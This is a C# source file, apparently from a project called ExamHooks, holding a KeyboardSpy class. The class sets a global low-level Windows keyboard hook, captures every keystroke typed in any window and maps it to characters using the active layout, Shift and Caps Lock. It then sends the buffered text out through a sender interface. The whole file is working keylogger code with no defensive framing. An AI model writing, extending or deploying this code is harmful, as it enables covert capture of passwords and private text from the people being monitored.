using ExamHooks.Interfaces;
using ExamHooks.Methods;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ExamHooks.Modules
{
    public class KeyboardSpy : INotifyPropertyChanged
    {
        private HookProc hookProc;
        private int hHook;
        private string keysStr;
        private int countEnterSym;

        public ISender Sender { get; set; }
        public int SizeBufer { get; set; }
        public event PropertyChangedEventHandler PropertyChanged;

        public string KeysStr
        {
            get
            {
                return keysStr;
            }
            private set
            {
                keysStr = value;
                OnPropertyChanged();
            }
        }
        public void OnPropertyChanged([CallerMemberName]string propertyName = "")
        {
            PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));
        }
        public void SetHook()
        {
            if (hHook != 0)
                return;

            hookProc = LowLevelKeyboardProc;
            hHook = WindowsHooks.GetHook(HookTypes.WH_KEYBOARD_LL, LowLevelKeyboardProc);
        }
        public void UnHook()
        {
            if (hHook != 0)
                WinApiMethods.UnhookWindowsHookEx(hHook);
        }

        public async void SendData()
        {
           await Sender.SendString(keysStr);
        }

        private int LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode < 0 || SizeBufer == 0|| (wParam.ToInt32() != (int)HookMessages.WM_KEYDOWN))
            {
                return WinApiMethods.CallNextHookEx(hHook, nCode, wParam, lParam);
            }

            Keys key = (Keys)Marshal.ReadInt32(lParam);

            string sym = GetLayoutSymbol(key);
            KeysStr += sym;
            countEnterSym++;
            if(countEnterSym>= SizeBufer)
            {
                SendData();
                countEnterSym = 0;
                KeysStr = String.Empty;
            }
            return WinApiMethods.CallNextHookEx(hHook, nCode, wParam, lParam);

        }

        private string GetLayoutSymbol(Keys keys)
        {
            if (keys == Keys.Enter || keys == Keys.Back)
            {
                return $"#{keys.ToString()}#";
            }

            IntPtr layout = WinApiMethods.GetKeyboardLayout(WinApiMethods.GetWindowThreadProcessId(WinApiMethods.GetForegroundWindow(), IntPtr.Zero));
            bool CapsLockState = (((ushort)WinApiMethods.GetKeyState(0x14)) & 0xffff) != 0;
            bool ShiftState = (WinApiMethods.GetAsyncKeyState((int)Keys.ShiftKey) & 0x8000) != 0;

            var buf = new StringBuilder(256);
            var keyboardState = new byte[256];

            if (CapsLockState ^ ShiftState)
                keyboardState[(int)Keys.ShiftKey] = 0xff;
            WinApiMethods.ToUnicodeEx((uint)keys, 0, keyboardState, buf, 256, 0, layout);
            return buf.ToString();
        }
    }
}
